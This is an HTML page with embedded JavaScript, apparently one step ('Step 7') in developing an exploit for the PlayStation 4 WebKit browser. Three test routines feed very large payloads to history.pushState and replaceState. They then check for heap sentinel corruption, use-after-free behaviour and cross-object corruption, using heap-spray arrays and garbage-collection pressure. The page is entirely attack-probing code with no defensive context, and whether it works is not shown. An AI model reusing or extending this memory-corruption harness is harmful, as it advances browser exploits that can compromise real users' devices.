<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit History.pushState – Step 7 Validation</title>
<style>
body {
    background: #000;
    color: #0f0;
    font-family: monospace;
}
button {
    font-size: 16px;
    margin: 5px;
}
#log {
    white-space: pre-wrap;
    margin-top: 10px;
}
</style>
</head>
<body>

<h2>PS4 WebKit – Step 7: Structural Corruption Validation</h2>

<button onclick="testOptionA()">Option A – Sentinel Corruption</button>
<button onclick="testOptionB()">Option B – Delayed Use (UAF)</button>
<button onclick="testOptionC()">Option C – Cross-Object Impact</button>

<div id="log"></div>

<script>
function log(msg) {
    document.getElementById("log").textContent += msg + "\n";
}

/* ===============================
   COMMON PAYLOAD GENERATOR
   =============================== */
function makePayload(size) {
    return {
        data: "A".repeat(size),
        nested: { x: 1 }
    };
}

/* ===============================
   OPTION A – SENTINEL CORRUPTION
   =============================== */
function testOptionA() {
    log("\n[Option A] Sentinel Heap Corruption Test");

    let sentinel = new Uint32Array(16);
    for (let i = 0; i < sentinel.length; i++) {
        sentinel[i] = 0x41414141;
    }

    log("Sentinel allocated");

    try {
        let payload = makePayload(695105);
        history.pushState(payload, "", "#A" + payload.data);
        history.replaceState(payload, "", "#B" + payload.data);
    } catch (e) {
        log("Exception during push/replace: " + e);
    }

    let corrupted = false;
    for (let i = 0; i < sentinel.length; i++) {
        if (sentinel[i] !== 0x41414141) {
            corrupted = true;
            log("CORRUPTION DETECTED at index " + i +
                " value=0x" + sentinel[i].toString(16));
        }
    }

    if (!corrupted) {
        log("No sentinel corruption observed");
    }
}

/* ===============================
   OPTION B – DELAYED USE (UAF)
   =============================== */
function testOptionB() {
    log("\n[Option B] Delayed Use / UAF Test");

    let payload = makePayload(695105);

    try {
        history.pushState(payload, "", "#UAF" + payload.data);
        history.replaceState(payload, "", "#UAF2" + payload.data);
    } catch (e) {
        log("Exception during push/replace: " + e);
    }

    log("State stored, waiting before reuse...");

    setTimeout(function () {
        try {
            log("Re-accessing payload after delay");
            payload.nested.x += 1;
            log("Payload still accessible, x=" + payload.nested.x);
        } catch (e) {
            log("UAF-like failure detected: " + e);
        }
    }, 800);
}

/* ===============================
   OPTION C – CROSS-OBJECT IMPACT
   =============================== */
function testOptionC() {
    log("\n[Option C] Cross-Object Heap Impact Test");

    try {
        let payload = makePayload(695105);
        history.pushState(payload, "", "#C" + payload.data);
        history.replaceState(payload, "", "#C2" + payload.data);
    } catch (e) {
        log("Exception during push/replace: " + e);
    }

    log("Triggering external allocations");

    let victims = [];
    for (let i = 0; i < 100; i++) {
        victims.push(new Uint32Array(256));
    }

    try {
        for (let i = 0; i < victims.length; i++) {
            victims[i][0] = 0x13371337;
        }
        log("Victim objects accessed successfully");
    } catch (e) {
        log("Cross-object corruption detected: " + e);
    }

    victims = null;

    try {
        for (let i = 0; i < 10; i++) {
            new ArrayBuffer(1024 * 1024);
        }
        log("GC pressure applied");
    } catch (e) {
        log("Crash during GC pressure: " + e);
    }
}
</script>

</body>
</html>
